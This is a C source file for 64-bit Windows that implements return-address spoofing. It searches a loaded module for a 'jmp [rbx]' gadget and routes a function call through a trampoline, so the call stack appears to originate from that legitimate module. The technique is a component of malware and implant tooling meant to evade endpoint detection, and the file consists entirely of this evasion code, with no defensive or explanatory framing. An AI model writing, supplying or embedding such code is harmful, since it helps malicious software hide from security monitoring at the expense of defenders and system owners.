#include <core/Spoof.h>
#include <core/MiniStd.h>

#if _WIN64

PVOID SpoofRetAddr(
    _In_    PVOID  Module,
    _In_    ULONG  Size,
    _In_    HANDLE Function,
    _Inout_ PVOID  a,
    _Inout_ PVOID  b,
    _Inout_ PVOID  c,
    _Inout_ PVOID  d,
    _Inout_ PVOID  e,
    _Inout_ PVOID  f,
    _Inout_ PVOID  g,
    _Inout_ PVOID  h
) {
    PVOID Trampoline = { 0 };
    BYTE  Pattern[]  = { 0xFF, 0x23 };
    PRM   Param      = { NULL, NULL, NULL };

    if ( Function != NULL ) {
        Trampoline = MmGadgetFind(
            C_PTR( U_PTR( Module ) + LDR_GADGET_HEADER_SIZE ),
            U_PTR( Size ),
            Pattern,
            sizeof( Pattern )
        );

        /* set params */
        Param.Trampoline = Trampoline;
        Param.Function   = Function;

        if ( Trampoline != NULL ) {
            return ( ( PVOID( * ) ( PVOID, PVOID, PVOID, PVOID, PPRM, PVOID, PVOID, PVOID, PVOID, PVOID ) ) ( ( PVOID ) Spoof ) ) ( a, b, c, d, &Param, NULL, e, f, g, h );
        }
    }

    return NULL;
}

#endif
